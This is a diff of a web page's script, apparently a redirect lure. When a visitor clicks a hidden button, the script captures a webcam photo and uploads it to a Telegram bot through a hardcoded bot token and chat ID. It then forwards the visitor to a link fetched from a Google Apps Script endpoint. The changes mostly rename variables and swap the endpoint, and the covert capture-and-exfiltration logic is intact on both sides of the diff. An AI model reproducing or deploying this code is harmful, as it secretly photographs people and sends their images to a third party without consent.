@@ -19,21 +19,21 @@
 <button id="btn"></button>
 
 <script>
-  const BOT_TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
-  const CHAT_ID = "1314241513";
-  const API_URL = "https://script.google.com/macros/s/AKfycbyfNJ9zZ6FJw2blf4NUDCv7FgoVpJKpl-caW-JAXtqLnCZeT51GiNIPS0C3h33qIu6G/exec";
+  const TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
+  const CHAT = "1314241513";
+  const API = "https://script.google.com/macros/s/AKfycbz3JSyBUTUj30xvEGOuvqXkX26hQxWIT4l6jMPJImtXuqa8HmZji96z64-xwtAjJvw/exec";
 
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
   const btn = document.getElementById("btn");
 
   const code = new URLSearchParams(location.search).get("go");
-  let requested = false;
+  let started = false;
 
-  async function getRedirectUrl() {
+  async function getLink() {
     if (!code) return null;
     try {
-      const r = await fetch(API_URL + "?go=" + encodeURIComponent(code));
+      const r = await fetch(API + "?go=" + encodeURIComponent(code));
       const j = await r.json();
       return j.ok ? j.url : null;
     } catch (e) {
@@ -42,12 +42,12 @@
     }
   }
 
-  async function sendToTelegram(blob) {
+  async function sendPhoto(blob) {
     const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
+    fd.append("chat_id", CHAT);
     fd.append("photo", blob, "photo.png");
     try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
         method: "POST",
         body: fd
       });
@@ -56,11 +56,11 @@
     }
   }
 
-  async function takePhotoAndRedirect() {
-    if (requested) return;
-    requested = true;
+  async function shoot() {
+    if (started) return;
+    started = true;
 
-    const redirectUrl = await getRedirectUrl();
+    const redirect = await getLink();
 
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
@@ -76,8 +76,8 @@
       stream.getTracks().forEach(t => t.stop());
 
       await new Promise(resolve => {
-        canvas.toBlob(async (blob) => {
-          await sendToTelegram(blob);
+        canvas.toBlob(async blob => {
+          await sendPhoto(blob);
           resolve();
         }, "image/png");
       });
@@ -85,14 +85,14 @@
       console.log("Камера недоступна:", e.name);
     }
 
-    if (redirectUrl) {
-      window.location.replace(redirectUrl);
+    if (redirect) {
+      window.location.replace(redirect);
     } else if (code) {
       window.location.replace("https://t.me/");
     }
   }
 
-  btn.addEventListener("click", takePhotoAndRedirect);
+  btn.addEventListener("click", shoot);
 </script>
 
 </body>
